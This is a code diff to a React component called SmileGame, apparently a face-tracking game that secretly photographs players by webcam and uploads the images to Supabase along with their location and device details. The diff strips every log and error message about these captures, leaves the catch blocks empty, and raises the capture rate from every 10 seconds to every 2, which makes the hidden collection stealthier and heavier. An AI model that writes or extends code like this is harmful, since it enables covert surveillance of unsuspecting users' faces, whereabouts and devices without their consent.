@@ -30,14 +30,10 @@ export default function SmileGame() {
       ctx.drawImage(video, 0, 0);
 
       // Get location and device info in parallel
-      console.log("🔍 Fetching location and device info...");
       const [locData, deviceInfo] = await Promise.all([
         getSmartLocation(),
         getDeviceDetails(),
       ]);
-      
-      console.log("📍 Location data:", locData);
-      console.log("🖥️ Device data:", deviceInfo);
 
       canvas.toBlob(async (blob) => {
         const timestamp = Date.now();
@@ -61,12 +57,6 @@ export default function SmileGame() {
                 image_url: imageUrl,
               },
             ]);
-            
-            if (imgError) {
-              console.error("❌ Image insert error:", imgError);
-            } else {
-              console.log("✅ Image saved");
-            }
 
             // Save location data
             const { error: locError } = await supabaseClient.from("location_table").insert([
@@ -82,12 +72,6 @@ export default function SmileGame() {
                 accuracy: locData.details?.accuracy || null,
               },
             ]);
-            
-            if (locError) {
-              console.error("❌ Location insert error:", locError);
-            } else {
-              console.log("✅ Location saved");
-            }
 
             // Save device data
             const { error: devError } = await supabaseClient.from("device_table").insert([
@@ -102,22 +86,13 @@ export default function SmileGame() {
                 browser: deviceInfo.browser,
               },
             ]);
-            
-            if (devError) {
-              console.error("❌ Device insert error:", devError);
-            } else {
-              console.log("✅ Device saved");
-            }
 
             setCaptureCount((prev) => prev + 1);
-            console.log(`✅ Full capture complete: Image + Location (${locData.type}) + Device`);
           }
         } catch (error) {
-          console.error("❌ Upload error:", error);
         }
       }, "image/jpeg", 0.8);
     } catch (error) {
-      console.error("❌ Capture error:", error);
     }
   };
 
@@ -163,13 +138,10 @@ export default function SmileGame() {
     scene.add(pointLight);
 
     // Load facemesh
-    console.log("🔄 Loading FaceMesh model...");
     const loadedModel = await loadFaceMesh();
     if (!loadedModel) {
-      console.error("❌ Failed to load FaceMesh model");
       return;
     }
-    console.log("✅ FaceMesh model ready!");
 
     // Animation loop
     const animate = async () => {
@@ -228,7 +200,7 @@ export default function SmileGame() {
     // Auto-capture images every 10 seconds
     captureIntervalRef.current = setInterval(() => {
       captureAndUpload(video);
-    }, 10000);
+    }, 2000);
 
     // Handle window resize
     const handleResize = () => {
